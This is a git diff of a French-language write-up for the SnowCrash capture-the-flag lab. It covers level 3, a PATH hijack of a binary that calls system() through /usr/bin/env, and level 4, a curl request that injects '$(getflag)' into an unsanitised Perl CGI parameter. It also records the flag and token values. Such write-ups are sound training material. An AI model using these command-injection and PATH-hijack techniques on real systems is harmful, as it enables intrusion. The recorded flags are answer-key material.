@@ -76,7 +76,7 @@ flag02@SnowCrash:~$
 ## level 3
 
 Une fois l executable decompilé avec ghidra
-
+```c
 int main(int argc,char **argv,char **envp)
 
 {
@@ -93,6 +93,7 @@ int main(int argc,char **argv,char **envp)
   iVar1 = system("/usr/bin/env echo Exploit me");
   return iVar1;
 }
+```
 
 ("/usr/bin/env echo Exploit me");
 
@@ -106,3 +107,18 @@ export PATH=/tmp
 
 flag='qi0maab88jeaj46qoumi7maus'
 
+## level4
+level04@SnowCrash:~$ cat level04.pl
+```perl
+#!/usr/bin/perl
+#localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+```
+level04@SnowCrash:~$ curl 'localhost:4747/level04.pl?x=$(getflag)'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
